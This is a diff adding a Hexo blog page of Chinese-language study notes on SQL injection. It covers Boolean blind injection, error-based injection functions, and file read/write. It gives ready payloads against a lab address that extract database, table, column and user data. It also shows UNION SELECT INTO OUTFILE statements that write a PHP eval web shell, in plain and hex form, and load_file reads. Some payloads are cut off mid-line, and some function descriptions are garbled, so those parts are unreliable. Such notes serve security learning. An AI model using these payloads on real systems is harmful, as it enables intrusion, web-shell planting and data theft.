@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SQL基础知识五、Boolean 盲注5.1含义:有些情况下，开发人员屏蔽了报错信息，导致攻击者无法通过报错信息进行注入的判断。这种情况下的注入，称为盲注。 盲注根据展现方式，分为boolean型盲注和时间型盲注。Boolean是基于真假的判断（true or false）; 不管输入什么，结果都只返回真或假两种情况； 通过and 1&#x3D;1和and 1&#x3D;2可以发现注入点。Boolean型盲注的关键在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/02/06/SQL1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL基础知识五、Boolean 盲注5.1含义:有些情况下，开发人员屏蔽了报错信息，导致攻击者无法通过报错信息进行注入的判断。这种情况下的注入，称为盲注。 盲注根据展现方式，分为boolean型盲注和时间型盲注。Boolean是基于真假的判断（true or false）; 不管输入什么，结果都只返回真或假两种情况； 通过and 1&#x3D;1和and 1&#x3D;2可以发现注入点。Boolean型盲注的关键在">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-06T10:06:29.958Z">
+<meta property="article:modified_time" content="2022-02-06T11:45:45.074Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SQL1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/06/SQL1/" class="article-date">
+  <time datetime="2022-02-06T10:06:29.958Z" itemprop="datePublished">2022-02-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL基础知识"><a href="#SQL基础知识" class="headerlink" title="SQL基础知识"></a>SQL基础知识</h1><h4 id="五、Boolean-盲注"><a href="#五、Boolean-盲注" class="headerlink" title="五、Boolean 盲注"></a>五、Boolean 盲注</h4><h5 id="5-1含义"><a href="#5-1含义" class="headerlink" title="5.1含义:"></a>5.1含义:</h5><p>有些情况下，开发人员屏蔽了报错信息，导致攻击者无法通过报错信息进行注入的判断。这<br>种情况下的注入，称为盲注。 盲注根据展现方式，分为boolean型盲注和时间型盲注。<br>Boolean是基于真假的判断（true or false）; 不管输入什么，结果都只返回真或假两种情况； 通过and 1=1和and 1=2可以发现注入点。<br>Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果 判断正确与否。</p>
+<h5 id="5-2Boolean型盲注的判断方式"><a href="#5-2Boolean型盲注的判断方式" class="headerlink" title="5.2Boolean型盲注的判断方式"></a>5.2Boolean型盲注的判断方式</h5><p>通过长度判断length():length(database())&gt;=x<br>通过字符判断substr():substr(database(),1,1) =‘s’<br>通过ascII码判断:ascii():ascii(substr(database(),1,1)) =x</p>
+<h5 id="5-3Boolean注入攻击"><a href="#5-3Boolean注入攻击" class="headerlink" title="5.3Boolean注入攻击"></a>5.3Boolean注入攻击</h5><p>Boolean注入是指构造SQL判断语句，通过查看页面的返回结果来推测哪些SQL判断条件是成立的，以此来获取数据库中的数据。<br>A:判断数据库名的长度</p>
+<p><a target="_blank" rel="noopener" href="http://172.16.16.10/web/sql/boolean.php?id=1&#39;">http://172.16.16.10/web/sql/boolean.php?id=1&#39;</a> and length(database())&gt;=1–+<br>B:判断数据库名</p>
+<p>‘and substr(database(),1,1)–+<br>C:Burp判断数据库名</p>
+<p>id=1’ and substr(database(),1,1)=’a’–+<br>D:Burpsuite爆破数据库的表名</p>
+<p>id=1’ and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’a’–+<br>E:Burp爆字段名</p>
+<p>id=1’ and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’a’–+<br>F:获取数据</p>
+<p>id=1’ and substr((select username from test.users limit 0,1),1,1)=’a’–+</p>
+<h4 id="六、五大报错注入"><a href="#六、五大报错注入" class="headerlink" title="六、五大报错注入"></a>六、五大报错注入</h4><p>利用条件：页面回显 SQL语句执行的错误信息，例如 mysql_error() </p>
+<p>updatexml() 函数： </p>
+<p>这个函数的第二个参数本应该是合法的 XPATH 路径，否则就会在引发报错的同时将传入的参数 </p>
+<p>进行输出。我们利用这个特征，当题目存在回显时，将我们想的到的信息传入这个函数的第二个 </p>
+<p>参数即可查询。 </p>
+<p>六种函数：GeometryCollection() </p>
+<ul>
+<li>如果任何自变量为<code>NULL</code>或任何几何自变量为空几何，则返回值为<code>NULL</code>。</li>
+<li>如果任何几何参数都不是语法上格式正确的几何，<code>ER_GIS_INVALID_DATA</code>则会发生错误。</li>
+<li>如果任何几何参数的SRID值都引用未定义的空间参考系统（SRS），<code>ER_SRS_NOT_FOUND</code>则会发生错误。</li>
+<li>否则，返回值为non-<code>NULL</code>。</li>
+</ul>
+<p>polygon() </p>
+<p>函数功能：该函数画一个由直线相闻的两个以上顶点组成的多边形，用当前画笔画多边形轮廓，用当前画刷和多边形填充模式填充多边形</p>
+<p>multipoint()</p>
+<p>multilinestring()</p>
+<p>linestring()</p>
+<ul>
+<li>如果任何自变量为<code>NULL</code>或任何几何自变量为空几何，则返回值为<code>NULL</code>。</li>
+<li>如果任何几何参数都不是语法上格式正确的几何，<code>ER_GIS_INVALID_DATA</code>则会发生错误。</li>
+<li>如果任何几何参数的SRID值都引用未定义的空间参考系统（SRS），<code>ER_SRS_NOT_FOUND</code>则会发生错误。</li>
+<li>否则，返回值为non-<code>NULL</code></li>
+</ul>
+<p>multipolygon()</p>
+<h3 id="七、文件读写"><a href="#七、文件读写" class="headerlink" title="七、文件读写"></a>七、文件读写</h3><p>7.1 手动 </p>
+<p>写文件1 ?id=-1’ union select 1,”<?php @eval(\$_POST[1]); ?>“,3 into outfile “/var/ww </p>
+<h1 id="可将文件内容转换成十六进制"><a href="#可将文件内容转换成十六进制" class="headerlink" title="可将文件内容转换成十六进制"></a>可将文件内容转换成十六进制</h1><p>?id=-1’ union select ,0x3c3f70687020406576616c28245f504f53545b315d293b203f3 </p>
+<p>有回显时 读取文件 </p>
+<p> ?id=-1’ union select 1,2,load_file(‘/var/www/html/1.php’)–+ </p>
+<p> 文件路径 可使用 十六进制</p>
+<p> ?id=-1’ union select ,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870) </p>
+<p>无回显 盲注读取文件 </p>
+<p>?id=-1’ and ascii(mid((select hex(load_file(‘/var/www/html/1.php’))),a,1))&gt;b </p>
+<p> 同时爆破 数字 a 和 ascii 值 b </p>
+<p>7.2 脚本 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/02/06/SQL1/" data-id="ckzb7a35r0000mov35uy8ghyw" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/01/28/SQL/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/02/06/SQL1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/28/SQL/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/26/web8/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/25/web7/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/24/web6/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
